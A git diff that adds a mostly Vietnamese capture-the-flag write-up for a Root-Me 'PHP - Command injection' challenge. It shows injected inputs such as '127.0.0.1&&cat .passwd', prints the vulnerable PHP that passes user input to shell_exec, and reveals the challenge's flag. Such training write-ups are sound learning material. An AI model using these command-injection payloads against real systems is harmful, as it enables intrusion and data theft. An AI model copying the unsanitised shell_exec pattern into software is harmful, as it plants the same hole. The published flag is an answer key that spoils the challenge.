@@ -12,6 +12,8 @@
 
 - [Weak password](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#weak-password)
 
+- [PHP - Command injection]()
+
 ### HTML - Source code
 
 ![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image.png?raw=true)
@@ -113,6 +115,61 @@ Thử nhập `username:admin` và `password:admin`:
 ![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image18.png?raw=true)
 
 **Password: admin**
+
+### PHP - Command injection
+
+![img](19)
+
+Start the challenge: 
+
+![img](20)
+
+Dựa vào mô tả thử thách "Find a vulnerabilty in this service and exploit it. You must manage to read index.php", thử truy cập `/index.php`:
+
+![img](21)
+
+-> Không đọc được. Thử nhập `index.php` và click submit:
+
+![img](22)
+
+-> Cũng không xem được. 
+
+Thử nhập `127.0.0.1`:
+
+![img](23)
+
+Thử nhập `127.0.0.1&&pwd`:
+
+![img](24)
+
+-> Câu lệnh `pwd` được thực thi, có thể website tồn tại lỗ hổng `Command Injection`. Thử nhập `127.0.0.1&&ls`:
+
+![img](25)
+
+-> Tìm được file `index.php`, thử nhập `127.0.0.1&&ls&&cat index.php`:
+
+![img](26)
+
+Xem response trong Burp Suite: 
+
+![img](27)
+
+-> Nội dung `index.php`:
+
+    <?php 
+    $flag = "".file_get_contents(".passwd")."";
+    if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+            $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+            echo $response;
+    }
+    ?>
+
+Qua nội dung đoạn mã, có thể flag nằm trong file `.passwd`, thử nhập `127.0.0.1&&cat .passwd`:
+
+![img](28)
+
+**Password: S3rv1ceP1n9Sup3rS3cure**
+
 
 
 
